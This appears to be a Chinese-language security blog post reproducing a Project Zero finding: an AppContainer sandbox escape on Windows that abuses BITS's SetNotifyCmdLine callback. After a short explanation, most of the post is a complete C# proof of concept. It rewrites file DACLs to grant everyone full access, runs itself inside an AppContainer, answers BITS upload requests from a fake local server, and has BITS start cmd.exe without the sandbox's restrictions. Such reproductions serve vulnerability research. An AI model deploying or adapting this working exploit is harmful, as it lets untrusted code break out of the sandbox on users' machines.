##  简要概述 ##

本文主要讨论[谷歌P0文章](https://googleprojectzero.blogspot.com/2020/04/you-wont-believe-what-this-one-line.html)中提到的Background Intelligent Transfer Service (BITS)服务的关于AppContainer逃逸的一种简单的复现.

##  简要分析 ##

关于AppContainer隔离机制的的介绍可以参考相关引用节的相关文章,这里不再赘述,,AppContainer进程属于对低完整性进程在PackageSid、Capabilities等更高粒度层面上实现的隔离，具有更加有限的功能.AppContainer不具有访问用户文件,有限的网络通信,和SMB共享访问等功能.常见的[AppContainer capability](https://docs.microsoft.com/en-us/windows/uwp/packaging/app-capability-declarations#custom-capabilities)可以在这里找到相关文档说明,谷歌的[NtApiDotNet项目](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/KnownSids.cs)项目也为我们提供的常见的已知SID.
![图1](https://ftp.bmp.ovh/imgs/2021/04/dac2b45a35c67c24.png)
![图2](https://ftp.bmp.ovh/imgs/2021/04/fb73df097bd8b868.png)

使用[Process Hacker工具](https://processhacker.sourceforge.io/)在图中可以看到AppContainer进程被赋予了指定的PackageSid和Capabilities SID的低完整性进程,windos也正是使用这些安全描述符（SD，下同）里的DACL（discretionaryaccess control list）来控制用户和用户组的访问权限。在这里我们可以利用记事本来进行尝试。![图3](https://ftp.bmp.ovh/imgs/2021/04/fca724957aeb76e7.png) 经过测试，记事本的运行过程似乎没有问题。但是，如果我们尝试使用记事本的文件 ->打开菜单，来打开其他文件（几乎是任何文件），我们会发现记事本无法访问常用的位置（例如：我的文档或我的图片）。这是因为该进程正在以低完整性级别来运行，而文件默认为中完整性级别。
进程管理器（Process Explorer）中的 "AppContainer"，使用的是低完整性级别。
如果我们希望记事本能够访问用户的文件（例如：文档和图片），那么就必须在这些对象中设置明确的权限，允许访问 AppContainer PackageSid。要使用的函数包括 SetNamedSecurityInfo，关于完整代码请参阅[GitHub项目](https://github.com/zodiacon/RunAppContainer/blob/master/RunAppContainer/RunAppContainerDlg.cpp).同样可以看到访问SMB共享和查询基本服务信息也被拒绝.
![图4](https://ftp.bmp.ovh/imgs/2021/04/064a05f8d2b40c38.png)

##  运行效果 ##

在AppContainer进程中调用BITS服务的[IBackgroundCopyJob::SetNotifyCmdLine](https://docs.microsoft.com/zh-cn/windows/win32/api/bits1_5/nf-bits1_5-ibackgroundcopyjob2-setnotifycmdline)
API会在完成上载或下载任务以后impersonate(模拟)调用方token并创建一个新进程,由于AppContainer进程不具有对本地文件进行写入的功能,所以只能使用上载模式,这里只需要赋予AppContainer进程CapabilityPicturesLibrary权限为了保证兼容性起见使用通用的windowscalculator的PackageSid,即可读取用户图片文件夹的文件作为上传文件,在一个任意的远程监听http服务模拟伪造的[BITS服务上传服务](https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-bup/f2411391-7785-4351-b419-fa794d7f9215),在文件成功上传后(实际上并没有真实的文件操作)既可触发回调.这里(BITS)服务并没有创建一个完全相同隔离等级的AppContainer进程作为回调,而是当调用方为AppContainer进程时新进程剥离了AppContainer的限制,转换为一个完全可控的低完整性进程(移除了PackageSid等),从而实现了有限的AppContainer逃逸.新进程已经可以创建子进程,读取本地文件,和访问SMB等低完整用户进程具有权限.
![图5](https://ftp.bmp.ovh/imgs/2021/04/e36e8589d8456bd0.png)
![图6](https://ftp.bmp.ovh/imgs/2021/04/bddbc8ce674be682.png)
![图7](https://ftp.bmp.ovh/imgs/2021/04/6ad3acbadf44205b.png)

##  相关代码 ##
```
using System;
using System.Collections.Generic;
using System.Diagnostics.CodeAnalysis;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using AppContainerBypass;
using NtApiDotNet;
using NtApiDotNet.Win32;

namespace AppContainerBypass
{

	class Program
	{
		static volatile ManualResetEvent me=new ManualResetEvent(false);
		static bool IsInAppContainer()
		{
			using (var token = NtToken.OpenProcessToken())
			{
				return token.AppContainer;
			}
		}

		static void UpdateSecurity(string path)
		{
			var sd = new NtApiDotNet.SecurityDescriptor("D:AI(A;;FA;;;WD)(A;;FA;;;AC)");
			using (var file = NtFile.Open(NtFileUtils.DosFileNameToNt(path), null, FileAccessRights.WriteDac))
			{
				file.SetSecurityDescriptor(sd, NtApiDotNet.SecurityInformation.Dacl);
			}
		}

		static void FixSecurity(string dir)
		{

			UpdateSecurity(dir);
			foreach (var file in Directory.GetFiles(dir))
			{
				UpdateSecurity(file);
			}
		}
		static string cmdExe = @"C:\Windows\System32\cmd.exe";
		static string mainExe = typeof(Program).Assembly.Location;

		static bool RestartInAppContainer(string[] args)
		{
			string FakeFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "1.txt");
			if (!File.Exists(FakeFile))
			{
				File.WriteAllText(FakeFile,"fake");

			}
			FixSecurity(Path.GetDirectoryName(typeof(Program).Assembly.Location));
			FixSecurity(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));


			List<Sid> caps = new List<Sid>
				{
					
					KnownSids.CapabilityInternetClient,
					KnownSids.CapabilityInternetClientServer,
					KnownSids.CapabilityPrivateNetworkClientServer,
					KnownSids.CapabilityPicturesLibrary

				};


			Win32ProcessConfig config = new Win32ProcessConfig
			{
				CreationFlags = CreateProcessFlags.NewConsole,
				CurrentDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
				ApplicationName = mainExe,
				CommandLine = mainExe + " " + FakeFile



			};
			config.SetAppContainerSidFromName("microsoft.windowscalculator_8wekyb3d8bbwe");

			config.Capabilities.AddRange(caps);

			using (var p = Win32Process.CreateProcess(config))
			{
				p.Process.Wait();
			}
			return true;

		}


		private static void Process_CANCEL_SESSION(HttpListenerContext context)
		{
			Guid SessionId = Guid.Parse(context.Request.Headers["BITS-Session-Id"].ToString());
			context.Response.Headers["BITS-Packet-Type"] = "Ack";
			context.Response.ContentLength64 = 0;
			context.Response.Headers["BITS-Session-Id"] = SessionId.ToString();
		}

		private static void Process_PING(HttpListenerContext context)
		{
			context.Response.Headers["BITS-Packet-Type"] = "Ack";
			context.Response.Headers["BITS-Error-Code"] = "1";
			context.Response.Headers["BITS-Error-Context"] = "";
			context.Response.ContentLength64 = 0;
		}

		private static void Process_CLOSE_SESSION(HttpListenerContext context)
		{
			Guid SessionId = Guid.Parse(context.Request.Headers["BITS-Session-Id"].ToString());
			context.Response.Headers["BITS-Packet-Type"] = "Ack";
			context.Response.ContentLength64 = 0;
			context.Response.Headers["BITS-Session-Id"] = SessionId.ToString();
		}
		private static void Process_FRAGMENT(HttpListenerContext context)
		{


			Guid SessionId = Guid.Parse(context.Request.Headers["BITS-Session-Id"].ToString());
			//string ContentName = context.Request.Headers["Content-Name"].ToString();
			string ContentRange = context.Request.Headers["Content-Range"].ToString();
			List<string> ContentRangeList = ContentRange.Split(new string[] { "/" }, StringSplitOptions.RemoveEmptyEntries).ToList();
			List<string> crange = ContentRangeList[0].Split(new string[] { "-" }, StringSplitOptions.RemoveEmptyEntries).ToList();
			string total_length = ContentRangeList[1];
			string range_start = crange[0];
			string range_end = crange[1];
			Console.Write("Process Process_FRAGMENT:range_start:" + range_start + ",range_end:" + range_end + ",total_length:" + total_length + Environment.NewLine);
			context.Response.Headers["BITS-Packet-Type"] = "Ack";
			context.Response.ContentLength64 = 0;
			context.Response.Headers["BITS-Session-Id"] = SessionId.ToString();
			context.Response.Headers["BITS-Received-Content-Range"] = (int.Parse(range_end) + 1).ToString();
		}
		private static void Process_CREATE_SESSION(HttpListenerContext context)
		{
			string supported_protocols = "{7df0354d-249b-430f-820d-3d2a9bef4931}";
			List<string> BITSSupportedProtocolsList = context.Request.Headers["BITS-Supported-Protocols"].Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries).ToList();
			if (BITSSupportedProtocolsList.Contains(supported_protocols))
			{
				Guid SessionId = Guid.NewGuid();
				context.Response.ContentLength64 = 0;
				context.Response.Headers["BITS-Protocol"] = supported_protocols;
				context.Response.Headers["BITS-Packet-Type"] = "Ack";
				context.Response.Headers["BITS-Session-Id"] = SessionId.ToString();
			}
		}

		private static void Process_BITS_POST(HttpListenerContext context)
		{
			try
			{


				if (context.Request.Headers["BITS-Packet-Type"] != null)
				{
					string BITSPacketType = context.Request.Headers["BITS-Packet-Type"].ToString().ToUpper();
					Console.Write("Process BITSPacketType:" + BITSPacketType + Environment.NewLine);
					switch (BITSPacketType)
					{
						case "CREATE-SESSION":
							{

								Process_CREATE_SESSION(context);

								break;
							}
						case "FRAGMENT":
							{
								Process_FRAGMENT(context);
								break;
							}
						case "CLOSE-SESSION":
							{
								Process_CLOSE_SESSION(context);
								break;
							}
						case "CANCEL-SESSION":
							{
								Process_CANCEL_SESSION(context);

								break;
							}
						case "PING":
							{
								Process_PING(context);
								break;
							}
						default:
							{

								break;
							}
					}

					context.Response.StatusCode = 200;
					context.Response.Close();

				}
			}
			catch (Exception e)
			{
				context.Response.StatusCode = 500;
				context.Response.Headers["BITS-Error-Code"] = "1";
				context.Response.Close();
				Console.WriteLine(e);

			}
			
		}


		private static void StartBitsServer()
		{
			try
			{

			
			using (HttpListener listener = new HttpListener())
			{
				listener.Prefixes.Add("http://localhost:5686/");
				listener.Start();
				Console.Write("StartBitsServer"+Environment.NewLine);
				me.Set();

				while (true)
				{
					HttpListenerContext context = listener.GetContext();

					Console.Write("Process Method:" + context.Request.HttpMethod.ToUpper() + Environment.NewLine);
					switch (context.Request.HttpMethod.ToUpper())
					{
						case "BITS_POST":
							{
								Process_BITS_POST(context);
								break;
							}
						default:
							{
								break;
							}
					}
				}
				}
			}
			catch (Exception e)
			{
				Console.WriteLine(e);
				throw;
			}
		}

		static void Main(string[] args)
		{
			try
			{


				
				if (IsInAppContainer())
				{
					RunBtsJob(args[0]);
				}
				else
				{
					Task.Factory.StartNew(() =>
					{
						StartBitsServer();
					});
					me.WaitOne();
					RestartInAppContainer(args.ToArray());

				}
			}
			catch (Exception e)
			{
				Console.WriteLine(e);
				throw;
			}
		}

		private static void RunBtsJob(string file)
		{
			IBackgroundCopyManager mgr = new BackgroundCopyManager() as IBackgroundCopyManager;
			Guid jobGuid;
			IBackgroundCopyJob job1;
			mgr.CreateJob("fake", BG_JOB_TYPE.BG_JOB_TYPE_UPLOAD, out jobGuid, out job1);
			IBackgroundCopyJob2 job = job1 as IBackgroundCopyJob2;
			job.SetNotifyCmdLine(cmdExe, cmdExe);
			job.SetNotifyFlags(BG_JOB_NOTIFICATION_TYPE.BG_NOTIFY_JOB_TRANSFERRED);
			job.AddFile("http://localhost:5686/fake.png", file);
			job.Resume();
			BG_JOB_STATE stat = BG_JOB_STATE.BG_JOB_STATE_QUEUED;
			while (stat != BG_JOB_STATE.BG_JOB_STATE_TRANSFERRED)
			{
				Thread.Sleep(1000);
				job.GetState(out stat);
			}
			job.Complete();
			Console.Write("Success");
		}
	}
}

```
##  相关引用 ##
[谷歌P0文章](https://googleprojectzero.blogspot.com/2020/04/you-wont-believe-what-this-one-line.html)

[谷歌P0文章翻译](https://www.anquanke.com/post/id/203790)

[Windows AppContainer 降权，隔离与安全](https://ipvb.gitee.io/container/2015/06/12/AppContainer/)

[隔离机制AppContainer](https://www.freebuf.com/articles/system/59893.html)

[Windows下如何创建低权限进程](https://www.cnblogs.com/liaoguifa/p/lower-process-integrity.html)

[腾讯反病毒实验室：深度解析AppContainer工作机制](https://blog.csdn.net/stevegao_tencent/article/details/44035643)

[如何在Windows AppCotainer中创建进程](https://www.4hou.com/posts/YM5O)

[SetNotifyCmdLine接口介绍](https://docs.microsoft.com/zh-cn/windows/win32/api/bits1_5/nf-bits1_5-ibackgroundcopyjob2-setnotifycmdline)

[AppContainer capability](https://docs.microsoft.com/en-us/windows/uwp/packaging/app-capability-declarations#custom-capabilities)

[BITS服务上传接口](https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-bup/f2411391-7785-4351-b419-fa794d7f9215)


##  相关项目 ##
[poc](https://gitee.com/cbwang505/app-container-bypass)